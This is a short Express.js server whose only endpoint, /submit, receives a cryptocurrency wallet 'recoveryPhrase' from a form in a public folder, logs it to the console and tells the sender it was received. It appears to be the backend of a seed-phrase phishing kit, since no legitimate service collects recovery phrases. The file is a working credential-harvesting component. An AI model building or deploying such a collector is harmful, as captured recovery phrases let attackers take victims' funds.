const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

// Middleware to parse JSON from requests
app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static("public"));

// Endpoint to receive form data
app.post("/submit", (req, res) => {
    const recoveryPhrase = req.body.recoveryPhrase;

    console.log("Received recovery phrase:", recoveryPhrase);

    // Send a response back to the client
    res.json({ message: "Recovery phrase received successfully!" });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
